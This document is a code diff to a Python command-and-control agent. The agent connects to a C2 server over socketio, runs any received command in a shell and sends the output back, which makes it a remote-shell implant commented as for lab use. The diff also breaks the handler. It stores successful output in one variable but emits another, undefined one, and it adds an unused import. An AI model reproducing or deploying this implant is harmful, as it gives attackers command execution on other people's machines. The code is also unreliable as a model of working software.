@@ -6,6 +6,7 @@ import socketio  # For real-time communication with the server
 import platform  # Optional: to get system info
 import subprocess  # For executing OS-level commands
 import uuid  # Generate unique ID for agent
+import requests
 
 sio = socketio.Client()  # Create SocketIO client
 
@@ -18,14 +19,20 @@ def connect():
     print("[+] Connected to C2.")
     sio.emit('exec_result', {'id': agent_id, 'output': 'Connected successfully'})
 
+@sio.event
+def disconnect():
+    print("[-] Disconnected from C2")
+
 @sio.on('command')
-def on_command(data):
-    # When a command is received from the C2 server
+def on_command(cmd):
+    print(f"[>] Received command: {cmd}")
     try:
-        output = subprocess.getoutput(data)  # Execute the command
+        # Execute the command
+        output = subprocess.check_output(cmd, shell=True, text=True)
     except Exception as e:
-        output = str(e)  # If execution fails, capture the error
-    sio.emit('exec_result', {'id': agent_id, 'output': output})  # Send result back
+        result = f"Error: {e}"
+    sio.emit('output', result)
 
 # Connect to the C2 server (replace 127.0.0.1 with actual IP)
 sio.connect('https://127.0.0.1:443', verify=False)  # SSL warning ignored for protected/lab use
+sio.wait()
